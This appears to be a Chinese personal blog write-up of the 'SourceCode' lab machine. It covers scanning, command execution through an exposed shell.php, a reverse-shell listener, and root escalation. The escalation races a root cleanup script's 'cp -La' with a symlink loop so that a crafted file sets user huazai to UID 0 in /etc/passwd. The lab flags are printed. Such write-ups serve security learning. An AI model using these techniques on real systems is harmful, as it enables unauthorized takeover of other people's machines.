---
layout: post
title: "[MAZE-SEC]SourceCode靶机个人复盘与学习"
date: 2026-06-17
categories: [MAZE-SEC]
---
```
靶机：SourceCode
作者：群主
靶机ID：698
类型：Linux - Baby
```

个人碎碎念：目前实力有限，能全凭自己能力做出来的靶机。。。几乎没有，但是有问题还是要想办法解决，过去也做过一些靶机，没打过的靶机也会重新跟着wp做一次，但是这样复现的作用有限，有些操作（特别是提权相关的）复现了但是浮于表面，没有深究原理，没有形成思路，所以从这个靶机开始，每个靶机（就算是baby，就算是看着wp打穿的）都要好好复盘下打穿的原理以及一些思路。对我来说，复盘靶机还是挺耗时间的，先看看一周能做多少吧
# User

先是nmap扫了，留的端口不多，先去80看看

```bash
b14ckb0x@b14ckb0x:~$ nmap -sT -p- -sV 192.168.5.71
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-17 16:17 +0800
Nmap scan report for 192.168.5.71 (192.168.5.71)
Host is up (0.0060s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.67 ((Debian))
MAC Address: E8:B0:C5:A2:6E:21 (Intel Corporate)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.04 seconds

```

主页直接有了credential，索性直接用ssh上，结果连接失败

![ref1](/assets/images/2026-06-17-SourceCode-review/ref1.png)

所以不是ssh直接连接，于是去扫了一下目录，发现还有login.php和shell.php，所以直接去login.php把帐号密码交了，进入到了shell.php

```bash
b14ckb0x@b14ckb0x:~$ dirsearch -u http://192.168.5.71/     

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25
Wordlist size: 11460

Output File: /home/b14ckb0x/reports/http_192.168.5.71/__26-06-17_20-33-53.txt

Target: http://192.168.5.71/

[20:33:53] Starting: 
[20:33:55] 403 -  317B  - /.ht_wsr.txt
[20:33:55] 403 -  317B  - /.htaccess.bak1
[20:33:55] 403 -  317B  - /.htaccess.orig
[20:33:55] 403 -  317B  - /.htaccess.sample
[20:33:55] 403 -  317B  - /.htaccess.save
[20:33:55] 403 -  317B  - /.htaccess_extra
[20:33:55] 403 -  317B  - /.htaccess_orig
[20:33:55] 403 -  317B  - /.htaccess_sc
[20:33:55] 403 -  317B  - /.htaccessBAK
[20:33:55] 403 -  317B  - /.htaccessOLD
[20:33:55] 403 -  317B  - /.htaccessOLD2
[20:33:55] 403 -  317B  - /.htm
[20:33:55] 403 -  317B  - /.html
[20:33:55] 403 -  317B  - /.htpasswd_test
[20:33:55] 403 -  317B  - /.htpasswds
[20:33:55] 403 -  317B  - /.httr-oauth
[20:33:55] 403 -  317B  - /.php
[20:34:13] 200 -  357B  - /login.php
[20:34:21] 403 -  317B  - /server-status
[20:34:21] 403 -  317B  - /server-status/
[20:34:21] 200 -   29B  - /shell.php

Task Completed
```

这个shell.php可以以www-data的身份执行命令，于是尝试反弹shell

![ref2](/assets/images/2026-06-17-SourceCode-review/ref2.png)

```bash
b14ckb0x@b14ckb0x:~$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.5.44] from (UNKNOWN) [192.168.5.71] 35302
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@SourceCode:/var/www/html$ ^Z
zsh: suspended  nc -lvnp 4444
                                                                                
b14ckb0x@b14ckb0x:~$ stty raw -echo;fg
[1]  + continued  nc -lvnp 4444
                               reset
reset: unknown terminal type unknown
Terminal type? xterm
```

然后就以www-data的身份拿到了shell，拿到shell后默认在/var/www/html，所以顺便看看php文件里藏什么了没有，然后没有。因此再去其他文件夹找找，在opt文件夹下找到了boob.sh，又在backup中找到了user.txt，www-data也可以直接读

```
www-data@SourceCode:/opt/backup$ cat user.txt
flag{user-945d9178d85464137929353a7c3a5857}
```

# Root

首页有提示要拆弹，因此提权肯定和boob.sh有关的。先看看内容

```bash
www-data@SourceCode:/opt$ cat boob.sh
#!/bin/bash

# clean home
rm -rf /home/huazai/*
rm -rf /home/huazai/.*


# clean tmp
rm -rf /tmp/*
rm -rf /tmp/.*

rm -rf /var/tmp/*
rm -rf /var/tmp/.*

# copy file keep all 
cp -La /opt/backup/.* /home/huazai/
cp -La /opt/backup/user.txt  /home/huazai/user.txt

#kick out
pkill -9 -u huazai
for i in $(ls /dev/pts)
do
	echo "! Source Code" > /dev/pts/$i
done
```

整体看来，脚本负责清空/tmp和/home/huazai文件夹，然后又从/opt/backup中还原/home/huazai，最后还会检查有没有huazai用户的进程，有就杀了。有两个比较值得注意的点，一个是还原的方式，不是简单的cp，还加了个La参数，查了一下发现意思，和链接解析有关的，不是直接简单复制原文件；另一个就是pkill -9 -u huazai，想必就是web页说的八分钟重置一次了，也就是说获取到huazai的shell后，每次只能操作一定时间。然后我的做题部分就到此结束了，因为直接卡在huazai外面了，后面开了才知道首页的credential可以直接用来su切用户，这也是本人的第一个习惯的误区，ssh用凭证登不上就自动认为用户用凭证也登录不上，不过ssh的配置文件里是可以指定哪个用户能登录，哪个不能的，可以直接查看，可以看到最后写了DenyUsers huazai。

```bash
www-data@SourceCode:/opt$ cat /etc/ssh/sshd_config
# Lots of comments ... 
Include /etc/ssh/sshd_config.d/*.conf
PermitRootLogin yes
AuthorizedKeysFile	.ssh/authorized_keys .ssh/authorized_keys2
PasswordAuthentication yes
KbdInteractiveAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_* COLORTERM NO_COLOR
Subsystem	sftp	/usr/lib/openssh/sftp-server
DenyUsers huazai
```

cp -La
这个命令由-L和-a参数组成，-L参数会让cp复制的时候，跟随符号链接，复制其指向的实际内容，-a则表示归档模式，会进行递归复制，会尽力保留文件的所有属性。这两个参数一起用好像是冲突的，因为a会不跟随链接，不过脚本写的是La，所以L优先级会大于a。

所以想到两种利用方法。`cp -La /opt/backup/.* /home/huazai/`，会把backup下的隐藏文件，复制到/home/huazai，但是由于其追踪链接，所以可以把其中的一个隐藏文件软链接到root.txt，比如`ln -snf /root/root.txt /opt/backup/.bashrc`，这样就能直接读flag，不过这个方法不行，backup文件夹huazai不可写，所以创建不了软链接，顺便一提因为这个原因sed也不能用来修改.bashrc，因为sed的本质是创建一个副本然后覆盖旧文件。

另一种方案是写入，`ln -snf /home/huazai/.bashrc /etc/passwd`，通过链接复制目的地的.bashrc到/etc/passwd，我们就可以覆盖其内容，因为脚本还要执行pkill用户，所以其权限肯定足够写入/etc/passwd，并且这个脚本大概是以root执行，不过有个问题是脚本会先执行rm再cp，因此会删掉添加的链接文件，必须利用竞争，在rm完后cp之前重新创建链接。

先创建好.bashrc

```bash
huazai@SourceCode:/opt/backup$ cat .bashrc
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
dhcpcd:x:100:65534:DHCP Client Daemon:/usr/lib/dhcpcd:/bin/false
systemd-timesync:x:991:991:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:990:990:System Message Bus:/nonexistent:/usr/sbin/nologin
sshd:x:989:65534:sshd user:/run/sshd:/usr/sbin/nologin
huazai:x:0:0:,,,:/root:/bin/bash
```

循环执行链接，等着被踢

```
huazai@SourceCode:/opt/backup$ while true; do
>     ln -sfn /etc/passwd /home/huazai/.bashrc
> done
```

再连接上已经是root了，获取root之后首先把boob.sh改了，以免被踢，然后就可以去取flag了

```bash
www-data@SourceCode:/var/www/html$ su huazai
Password: 
root@SourceCode:/var/www/html# cd /root
root@SourceCode:~# cat root.txt
flag{root-d854d6197d2345c36879dff1ea0bbb42}
```


# 总结

主要是学习了利用软链接去读写文件的思路（虽然这里读没有成功），以后应该还会遇到类似利用的靶机吧。第一次复盘，尽量都把每种方法都尝试一下，这样久了就知道哪些路可以走哪些不可以了（比如我这里sed -i了好多次都没改成功，明明.bashrc具有写权限，这种事情下次就会记得了）


